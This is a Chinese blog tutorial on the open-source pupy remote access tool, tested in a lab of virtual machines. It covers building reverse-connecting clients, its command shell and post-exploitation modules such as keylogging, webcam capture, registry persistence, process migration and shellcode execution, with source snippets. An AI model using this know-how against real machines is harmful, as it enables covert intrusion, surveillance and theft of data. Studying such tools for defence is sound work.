<h1 id="x00-">0x00 前言</h1>

<hr />

<p>菜鸡我总结一下一个python远控——pupy的使用帮助，github地址为：<a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a>，作者对其能够实现的功能写得很清除。其主要依赖rpyc来实现远程控制，并且使用Python作为脚本语言从而实现跨平台操作，再使用PupyServer和PupyCmd的继承，实现控制端的主要功能，各个模块均继承自PupyModules来通过run命令实现对应模块功能。</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/dir1.png" alt="" /></p>

<p>client目录存放客户端（受控端）脚本以及一些源文件，docs则是说明文档相关，pupy则是服务端（控制端）相关脚本</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/dir2.png" alt="" /></p>

<p>cypto中是一些方向ssl连接需要的证书文件，modules中是一些run命令运行的模块脚本，packages中是不同平台上实现模块功能的根本脚本，payload_templates则是生成客户端exe及dll的模板，pupylib中是服务端核心功能中几个重要的类文件，pupy.conf是配置文件设置服务地址端口，颜色显示及命令别名，pupygen.py生成Windows平台上的exe或dll客户端，pupysh.py则是pypushell主程序</p>

<h1 id="x01-">0x01 准备</h1>

<hr />

<h2 id="windows">1.生成Windows上的客户端</h2>

<p>github的ReadMe里面都写得很清楚，这里我开了3个虚拟机，服务端（主控端）的Kali2（172.16.162.130），客户端（受控端）的xp（172.16.162.133）和Kali（172.16.162.129），穷屌我这里就不测试Mac了</p>

<p>对于Windows主要是通过pupy文件夹下的pupygen.py生成对应x86或x64平台的exe或dll（用于反向注射）</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/1.png" alt="" /></p>

<p>host为回连主机地址，-p指定回连端口，-t指定生成文件类型，-o指定生成文件名,然后生成对应二进制文件</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">i</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&quot;&lt;default_connect_back_host&gt;:&lt;default_connect_back_port&gt;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="o">...</span>
<span class="n">new_host</span><span class="o">=</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="se">\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>
<span class="o">...</span>
<span class="n">binary</span><span class="o">=</span><span class="n">binary</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">+</span><span class="n">new_host</span><span class="o">+</span><span class="n">binary</span><span class="p">[</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">new_host</span><span class="p">):]</span></code></pre></div>

<p>找到二进制文件中对应的标志位，再将host及ip写入</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/2.png" alt="" /></p>

<h2 id="kali">2.生成Kali上的客户端</h2>

<p>Windows平台下如果有Python，rpyc，pupy也是类似的</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/3.png" alt="" /></p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span>
        <span class="n">tab</span><span class="o">=</span><span class="n">HOST</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">rhost</span><span class="o">=</span><span class="n">tab</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">tab</span><span class="p">)</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
            <span class="n">rport</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">tab</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">rport</span><span class="o">=</span><span class="mi">443</span>
        <span class="k">print</span> <span class="s">&quot;connecting to </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">=</span><span class="n">rpyc</span><span class="o">.</span><span class="n">ssl_connect</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">service</span> <span class="o">=</span> <span class="n">ReverseSlaveService</span><span class="p">)</span></code></pre></div>

<p>默认是443端口并以冒号分割，再使用rpyc模块进行ssl连接到控制端，循环等待并打印出连接信息</p>

<h1 id="x02-">0x02 开始</h1>

<hr />

<p>直接运行pupy/pupy/pupysh.py便可以启用客户端（pupyshell），自然使用help或?查看帮助</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/4.png" alt="" /></p>

<p>在pupysh.py中主要是导入pupylib.PupyServer和pupylib.PupyCmd，分别实例化，并使用PupyCmd继承cmd.Cmd中的cmdloop()方法，来解析并执行命令</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">...</span>
<span class="n">pupyServer</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyServer</span><span class="o">.</span><span class="n">PupyServer</span><span class="p">()</span>
<span class="o">...</span>
<span class="n">pupyServer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">pcmd</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyCmd</span><span class="o">.</span><span class="n">PupyCmd</span><span class="p">(</span><span class="n">pupyServer</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">pcmd</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span></code></pre></div>

<p>有趣的是在有中文版xp的受控端进入后，使用clients或sessions命令时均会出现如下错误</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/error.png" alt="" /></p>

<p>看是解码错误，便在pupylib/PupyCmd.py中在导入模块后再添加以下代码就okay啦</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">getdefaultencoding</span><span class="p">()</span><span class="o">!=</span><span class="s">&#39;gbk&#39;</span><span class="p">:</span>
  <span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">)</span></code></pre></div>

<h2 id="clients">clients</h2>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_clients</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot; alias for sessions &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">do_sessions</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span></code></pre></div>

<p>可以看出来是和sessions的功能一样</p>

<h2 id="sessions">sessions</h2>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/5.png" alt="" /></p>

<p>-i是设置过滤器（也可用于其他命令），-g重置过滤器，-l列出所有存活会话，-k杀死选择会话</p>

<p>会话则会列举出”id”, “user”, “hostname”, “platform”, “release”, “os_arch”, “address”这些值</p>

<h2 id="exit">exit</h2>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot; Quit Pupy Shell &quot;&quot;&quot;</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div>

<p>直接退出，没什么好说的</p>

<h2 id="jobs">jobs</h2>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/6.png" alt="" /></p>

<p>-h帮助，-l列举出所有任务，-k后接job_id杀死该job，-p后接job_id打印出该job输出</p>

<h2 id="python">python</h2>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/7.png" alt="" /></p>

<p>运行本地的Python环境，用于调试</p>

<h2 id="read">read</h2>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/8.png" alt="" /></p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot; execute a list of commands from a file &quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">arg</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="s">&quot;usage: read &lt;filename&gt;&quot;</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">cmdqueue</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></code></pre></div>

<p>接受一个文件，并逐行执行命令</p>

<h1 id="x03-run">0x03 run</h1>

<hr />

<p>首先来介绍一下list_moudules和run命令（和msf很类似）</p>

<h2 id="listmodules">list_modules</h2>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">PupyCmd</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
<span class="k">def</span> <span class="nf">do_list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot; List available modules with a brief description &quot;&quot;&quot;</span>
    <span class="k">for</span> <span class="n">m</span><span class="p">,</span><span class="n">d</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">pupsrv</span><span class="o">.</span><span class="n">list_modules</span><span class="p">():</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;{:&lt;20}   {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">color</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="s">&#39;grey&#39;</span><span class="p">)))</span>

<span class="n">PupyServer</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
<span class="k">def</span> <span class="nf">list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">l</span><span class="o">=</span><span class="p">[]</span>
    <span class="k">for</span> <span class="n">loader</span><span class="p">,</span> <span class="n">module_name</span><span class="p">,</span> <span class="n">is_pkg</span> <span class="ow">in</span> <span class="n">pkgutil</span><span class="o">.</span><span class="n">iter_modules</span><span class="p">(</span><span class="n">modules</span><span class="o">.</span><span class="n">__path__</span><span class="p">):</span>
        <span class="n">module</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">get_module</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
        <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">module_name</span><span class="p">,</span><span class="n">module</span><span class="o">.</span><span class="n">__doc__</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">l</span></code></pre></div>

<p>将modules包中脚本所包含的modules都列举出来，并附加简要说明</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/9.png" alt="" /></p>

<p>各模块支持的平台如下</p>

<ul>
  <li>migrate (windows only)
    <ul>
      <li>inter process architecture injection also works (x86-&gt;x64 and x64-&gt;x86)</li>
    </ul>
  </li>
  <li>keylogger (windows only)</li>
  <li>persistence (windows only)</li>
  <li>screenshot (windows only)</li>
  <li>webcam snapshot (windows only)</li>
  <li>command execution</li>
  <li>download</li>
  <li>upload</li>
  <li>socks5 proxy</li>
  <li>local port forwarding</li>
  <li>interactive shell (cmd.exe, /bin/sh, …)</li>
  <li>interactive python shell</li>
  <li>shellcode exec (thanks to @byt3bl33d3r)</li>
</ul>

<h2 id="run">run</h2>

<p>run命令则是直接运行这些模块</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/10.png" alt="" /></p>

<p>-h帮助，-f设置客户端过滤条件，–bg后台运行，后接模块及其参数</p>

<p>对于过滤条件的设置，可以直接指定clients输出id值，或者是其他冒号分割的名值对</p>

<p>在pupy.conf文件中，主命令info，ps，migrate，exec，pyexe，kill分别具有run modules功能中的别名get_info，ps，migrate，shell_exec，pyexe，process_kill</p>

<p>下面介绍一下相关模块的功能</p>

<h3 id="interactiveshell">interactive_shell</h3>

<p>交互shell所有平台均支持，这里我把显示Windows的编码换成了cp936，可以良好显示中文啦</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/11.png" alt="" /></p>

<h3 id="shellexec">shell_exec</h3>

<p>直接执行远程shell命令，Windows上的编码还是换成cp936</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">shell_exec</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
<span class="o">...</span>
<span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">is_windows</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;cp936&#39;</span><span class="p">)</span><span class="c">#437&#39;)</span></code></pre></div>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/16.png" alt="" /></p>

<h3 id="pyshell">pyshell</h3>

<p>开启远程Python交互shell</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/17.png" alt="" /></p>

<h3 id="pyexec">pyexec</h3>

<p>直接在远程系统上执行Python代码，–file接文件或-c接代码</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/18.png" alt="" /></p>

<h3 id="download">download</h3>

<p>通过使用<code>from rpyc.utils.classic import download</code>，实现从远程系统上下载文件</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/12.png" alt="" /></p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">remote_file</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote_file</span><span class="p">)</span>
<span class="n">rep</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">,</span><span class="s">&quot;downloads&quot;</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">short_name</span><span class="p">())</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">local_file</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">rep</span><span class="p">)</span></code></pre></div>

<p>如果未指明本地路径，则存储在/data/downloads中</p>

<h3 id="upload">upload</h3>

<p>通过使用<code>from rpyc.utils.classic import upload</code>实现上传，功能与download相仿</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/13.png" alt="" /></p>

<h3 id="search">search</h3>

<p>在指定path中搜索string</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/search.png" alt="" /></p>

<h3 id="getinfo">get_info</h3>

<p>获取受控端平台信息</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/14.png" alt="" /></p>

<h3 id="exit-1">exit</h3>

<p>退出受控端并确认</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/15.png" alt="" /></p>

<h3 id="ps">ps</h3>

<p>列出进程，默认给出’username’, ‘pid’, ‘arch’, ‘exe’的信息，-a则给出’username’, ‘pid’, ‘arch’, ‘name’, ‘exe’, ‘cmdline’, ‘status’</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/19.png" alt="" /></p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/20.png" alt="" /></p>

<h3 id="getprivs">getprivs</h3>

<p>获取SeDebug权限</p>

<h3 id="processkill">process_kill</h3>

<p>杀死pid进程</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/21.png" alt="" /></p>

<h3 id="socks5proxy">socks5proxy</h3>

<p>开启socks5代理，-p指定端口</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/22.png" alt="" /></p>

<h3 id="portfwd">portfwd</h3>

<p>本地或远程端口转发，远程端口转发还未开发，本地端口转发则是<code>-L [&lt;LOCAL_ADDR&gt;]:&lt;LOCAL_PORT&gt;:&lt;REMOTE_ADDR&gt;:&lt;REMOTE_PORT&gt;</code>，-k则kill掉对应的id转发（id依次增一）</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/portfwd.png" alt="" /></p>

<h3 id="shellexec-1">shell_exec</h3>

<p>直接执行shellcode</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/shellcode_exec.png" alt="" /></p>

<h3 id="keylogger">keylogger</h3>

<p>键盘记录</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/23.png" alt="" /></p>

<h3 id="screenshot">screenshot</h3>

<p>截屏，-e遍历屏幕，-s SCREEN指定特定的屏幕（穷吊没验证），-v截屏后直接预览</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/24.png" alt="" /></p>

<h3 id="webcamsnap">webcamsnap</h3>

<p>捕捉网络摄像头，-d DEVICE指定特定的设备（同没验证），-v捕捉后直接预览</p>

<h3 id="migrate">migrate</h3>

<p>迁移至其他进程（由pid指定）</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/migrate.png" alt="" /></p>

<h3 id="persistence">persistence</h3>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">persistence</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
<span class="o">...</span> 
<span class="n">remote_path</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="s">&quot;%TEMP%</span><span class="se">\\</span><span class="s">{}.exe&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">12</span><span class="p">))])))</span></code></pre></div>

<p>权限维持，写入到注册表中（对应临时目录下的随机命令exe），并开机启动</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/persistence.png" alt="" /></p>

<h3 id="msgbox">msgbox</h3>

<p>最后作者示范了一下如何编写这个msgbox模块</p>

<p>首先新建一个pupy/packages/windows/all/pupwinutils/msgbox.py ，再写一个你想导入受控端的类或函数</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">threading</span>    

<span class="k">def</span> <span class="nf">MessageBox</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">):</span>
    <span class="n">t</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">MessageBoxA</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">t</span><span class="o">.</span><span class="n">daemon</span><span class="o">=</span><span class="bp">True</span>
    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></code></pre></div>

<p>然后再创建一个模块来导入我们包和调用我们的函数</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">MsgBoxPopup</span><span class="p">(</span><span class="n">PupyModule</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot; Pop up a custom message box &quot;&quot;&quot;</span>    

    <span class="k">def</span> <span class="nf">init_argparse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span> <span class="o">=</span> <span class="n">PupyArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">&quot;msgbox&quot;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">__doc__</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;--title&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;msgbox title&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;text&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;text to print in the msgbox :)&#39;</span><span class="p">)</span>    

    <span class="nd">@windows_only</span>
    <span class="k">def</span> <span class="nf">is_compatible</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">pass</span>    

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">load_package</span><span class="p">(</span><span class="s">&quot;pupwinutils.msgbox&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;pupwinutils.msgbox&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">MessageBox</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s">&quot;message box popped !&quot;</span><span class="p">)</span></code></pre></div>

<p>title指定标题，再接内容</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/msg.png" alt="" /></p>

